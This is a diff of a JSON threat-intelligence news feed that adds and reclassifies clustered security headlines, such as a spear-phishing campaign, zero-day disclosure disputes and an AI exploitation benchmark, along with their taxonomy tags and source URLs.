-        "link": "https://www.infosecurity-magazine.com/news/konvu-wins-cyber-startup-award/",
-        "published": "2026-06-03T13:30:00+00:00",
-        "summary": "Inaugural Infosecurity Europe Cyber Startup Award Winner Impresses Panel with Ability Help Prioritize Vulnerabilities in AI era",
+        "title": "China Uses Dual-Method Cyberattack on Czech Orgs",
+        "link": "https://www.darkreading.com/threat-intelligence/china-uses-dual-method-attack-czech-taiwan-orgs",
+        "published": "2026-06-02T19:50:53+00:00",
+        "summary": "China is stealing data from high-value targets via a sneaky, double-layer spear-phishing campaign that includes the Azureveil malware.",
         "full_body": "",
         "fetch_status": "not_attempted",
         "taxonomy": {
-          "threat_categories": [],
+          "threat_categories": [
+            "phishing_social_eng"
+          ],
           "actor_attribution": [],
           "affected_industries": [],
           "affected_products": [],
@@ -8128,7 +8101,7 @@
           "cve_ids": [],
           "attack_techniques": [],
           "urgency_signals": [],
-          "content_type": "vulnerability_disclosure",
+          "content_type": "incident_report",
           "confidence_tier": "tier_4_news",
           "role_map": {},
           "weak_tags": {
@@ -8138,14 +8111,16 @@
       },
       "corroborating_sources": [
         {
-          "source": "Infosecurity Magazine",
+          "source": "Dark Reading",
           "cohort": "cyber_news_breach_reporting",
-          "title": "Infosecurity Europe: Vulnerability Management Innovator Konvu Wins Cyber Startup Award",
-          "link": "https://www.infosecurity-magazine.com/news/konvu-wins-cyber-startup-award/",
-          "published": "2026-06-03T13:30:00+00:00",
-          "summary": "Inaugural Infosecurity Europe Cyber Startup Award Winner Impresses Panel with Ability Help Prioritize Vulnerabilities in AI era",
+          "title": "China Uses Dual-Method Cyberattack on Czech Orgs",
+          "link": "https://www.darkreading.com/threat-intelligence/china-uses-dual-method-attack-czech-taiwan-orgs",
+          "published": "2026-06-02T19:50:53+00:00",
+          "summary": "China is stealing data from high-value targets via a sneaky, double-layer spear-phishing campaign that includes the Azureveil malware.",
           "taxonomy": {
-            "threat_categories": [],
+            "threat_categories": [
+              "phishing_social_eng"
+            ],
             "actor_attribution": [],
             "affected_industries": [],
             "affected_products": [],
@@ -8153,7 +8128,100 @@
             "cve_ids": [],
             "attack_techniques": [],
             "urgency_signals": [],
-            "content_type": "vulnerability_disclosure",
+            "content_type": "incident_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "c7dde361f6",
+      "priority_score": 8,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "zero_day"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "legal_professional"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "zero_day"
+        ],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "Dark Reading",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Microsoft's Zero-Day Legal Threats Spark Backlash",
+        "link": "https://www.darkreading.com/application-security/microsoft-zero-day-legal-threats-backlash",
+        "published": "2026-06-01T18:52:26+00:00",
+        "summary": "After a disgruntled security researcher published several zero-day exploits in recent weeks, Microsoft seemingly indicated criminal charges were in order.",
+        "full_body": "",
+        "fetch_status": "not_attempted",
+        "taxonomy": {
+          "threat_categories": [
+            "zero_day"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "legal_professional"
+          ],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "zero_day"
+          ],
+          "content_type": "news_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Dark Reading",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Microsoft's Zero-Day Legal Threats Spark Backlash",
+          "link": "https://www.darkreading.com/application-security/microsoft-zero-day-legal-threats-backlash",
+          "published": "2026-06-01T18:52:26+00:00",
+          "summary": "After a disgruntled security researcher published several zero-day exploits in recent weeks, Microsoft seemingly indicated criminal charges were in order.",
+          "taxonomy": {
+            "threat_categories": [
+              "zero_day"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "legal_professional"
+            ],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "zero_day"
+            ],
+            "content_type": "news_report",
             "confidence_tier": "tier_4_news",
             "role_map": {},
             "weak_tags": {
@@ -8342,6 +8410,171 @@
       ]
     },
     {
+      "cluster_id": "bb5fa910dd",
+      "priority_score": 8,
+      "member_count": 2,
+      "corroborating_source_count": 1,
+      "strong_signals": [
+        "OpenAI/ChatGPT"
+      ],
+      "taxonomy": {
+        "threat_categories": [
+          "phishing_social_eng"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [
+          "OpenAI/ChatGPT"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report",
+          "vulnerability_disclosure"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "Infosecurity Magazine",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Infosecurity Europe: Mythos Outperforms GPT5.5 on Google Chrome Vulnerability Exploits, Says New Benchmark",
+        "link": "https://www.infosecurity-magazine.com/news/mythos-gpt-chrome-exploits/",
+        "published": "2026-06-04T13:00:00+00:00",
+        "summary": "A Bugcrowd researcher has unveiled ExploitBench, an independent benchmark of AI models for vulnerability exploitation",
+        "full_body": "",
+        "fetch_status": "not_attempted",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [
+            "OpenAI/ChatGPT"
+          ],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "vulnerability_disclosure",
+          "confidence_tier": "tier_4_news",
+          "role_map": {
+            "OpenAI/ChatGPT": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Infosecurity Magazine",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Infosecurity Europe: Mythos Outperforms GPT5.5 on Google Chrome Vulnerability Exploits, Says New Benchmark",
+          "link": "https://www.infosecurity-magazine.com/news/mythos-gpt-chrome-exploits/",
+          "published": "2026-06-04T13:00:00+00:00",
+          "summary": "A Bugcrowd researcher has unveiled ExploitBench, an independent benchmark of AI models for vulnerability exploitation",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "OpenAI/ChatGPT"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "vulnerability_disclosure",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "OpenAI/ChatGPT": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "8f36ac3451",
+      "priority_score": 8,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "vulnerability_disclosure"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "Infosecurity Magazine",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Infosecurity Europe: Vulnerability Management Innovator Konvu Wins Cyber Startup Award",
+        "link": "https://www.infosecurity-magazine.com/news/konvu-wins-cyber-startup-award/",
+        "published": "2026-06-03T13:30:00+00:00",
+        "summary": "Inaugural Infosecurity Europe Cyber Startup Award Winner Impresses Panel with Ability Help Prioritize Vulnerabilities in AI era",
+        "full_body": "",
+        "fetch_status": "not_attempted",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "vulnerability_disclosure",
+          "confidence_tier": "tier_4_news",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Infosecurity Magazine",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Infosecurity Europe: Vulnerability Management Innovator Konvu Wins Cyber Startup Award",
+          "link": "https://www.infosecurity-magazine.com/news/konvu-wins-cyber-startup-award/",
+          "published": "2026-06-03T13:30:00+00:00",
+          "summary": "Inaugural Infosecurity Europe Cyber Startup Award Winner Impresses Panel with Ability Help Prioritize Vulnerabilities in AI era",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "vulnerability_disclosure",
+            "confidence_tier": "tier_4_news",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "ab1941e554",
       "priority_score": 8,
       "member_count": 1,
@@ -8465,7 +8698,7 @@
         ]
       },
       "cluster_count": 9,
-      "article_count": 17,
+      "article_count": 18,
       "cohesion": 0.255,
       "shared_strong_signals": [
         "Palo Alto Networks"
@@ -8491,6 +8724,7 @@
         "https://thehackernews.com/2026/05/pan-os-globalprotect-authentication.html",
         "https://unit42.paloaltonetworks.com/active-exploitation-of-pan-os-cve-2026-0257/",
         "https://www.infosecurity-magazine.com/news/palo-alto-highseverity-bug/",
+        "https://www.darkreading.com/threat-intelligence/patch-palo-alto-auth-bypass-bug-exploit",
         "https://risky.biz/RBNEWS571/",
         "https://cyberscoop.com/palo-alto-networks-cve-2026-0257-exploited-vulnerability/",
         "https://thehackernews.com/2026/06/cisa-adds-exploited-magento-rce-flaw.html",
@@ -8591,7 +8825,7 @@
         ]
       },
       "cluster_count": 2,
-      "article_count": 9,
+      "article_count": 10,
       "cohesion": 0.2,
       "shared_strong_signals": [
         "CVE-2026-44825"
@@ -8607,6 +8841,7 @@
         "https://thehackernews.com/2026/05/pan-os-globalprotect-authentication.html",
         "https://unit42.paloaltonetworks.com/active-exploitation-of-pan-os-cve-2026-0257/",
         "https://www.infosecurity-magazine.com/news/palo-alto-highseverity-bug/",
+        "https://www.darkreading.com/threat-intelligence/patch-palo-alto-auth-bypass-bug-exploit",
         "https://risky.biz/RBNEWS571/",
         "https://cyberscoop.com/palo-alto-networks-cve-2026-0257-exploited-vulnerability/",
         "https://horizon3.ai/attack-research/vulnerabilities/cve-2026-44825/"
@@ -8882,8 +9117,8 @@
         "https://www.securityweek.com/in-other-news-anthropic-maps-ai-threats-unpatched-comodo-flaw-palantir-chief-eyed-for-cisa/",
         "https://simonwillison.net/2026/May/30/how-we-contain-claude/#atom-everything",
         "https://www.helpnetsecurity.com/2026/06/05/anthropic-ai-cyber-activity-analysis/",
-        "https://www.infosecurity-magazine.com/news/anthropic-glasswing-expansion/",
         "https://thehackernews.com/2026/06/claude-code-github-action-flaw-let-one.html",
+        "https://www.infosecurity-magazine.com/news/anthropic-glasswing-expansion/",
         "https://www.reddit.com/r/cybersecurity/comments/1txz6l2/microsoft_discovered_that_anthropics_claude_code/",
         "https://www.reddit.com/r/AskNetsec/comments/1twklcc/does_anyone_use_rule_feeds_in_2026/",
         "https://unit42.paloaltonetworks.com/flutterbridge-new-fluttershell-backdoor/",
